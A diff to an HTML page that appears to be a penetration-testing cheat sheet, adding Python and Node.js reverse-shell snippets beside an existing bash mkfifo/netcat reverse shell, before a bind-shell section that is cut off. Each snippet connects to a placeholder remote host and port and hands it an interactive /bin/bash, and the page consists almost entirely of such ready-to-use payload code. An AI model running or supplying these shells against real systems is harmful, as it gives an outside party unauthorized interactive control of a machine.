@@ -200,6 +200,34 @@
 <h2 id="bash"><a class="header" href="#bash">bash</a></h2>
 <pre><code class="language-bash">mkfifo /tmp/ffifo; /bin/bash -i &lt; /tmp/ffifo 2&gt;&amp;1 | nc $remote_ip $port &gt; /tmp/ffifo
 </code></pre>
+<h2 id="python"><a class="header" href="#python">python</a></h2>
+<pre><code class="language-python">import os
+import socket
+import subprocess
+
+s = socket.socket()
+s.connect((HOST, PORT))
+ 
+for fd in (0, 1, 2):
+    os.dup2(s.fileno(), fd)
+ 
+subprocess.call(["/bin/bash", "-i"])
+
+</code></pre>
+<h2 id="node"><a class="header" href="#node">node</a></h2>
+<pre><code class="language-js">(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/bash", ["-i"]);
+    var client = new net.Socket();
+    client.connect(PORT, HOST, function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/;
+})();
+</code></pre>
 <h1 id="bind-shell"><a class="header" href="#bind-shell">Bind shell</a></h1>
 <h2 id="bash-1"><a class="header" href="#bash-1">bash</a></h2>
 <pre><code class="language-bash">mkfifo /tmp/f
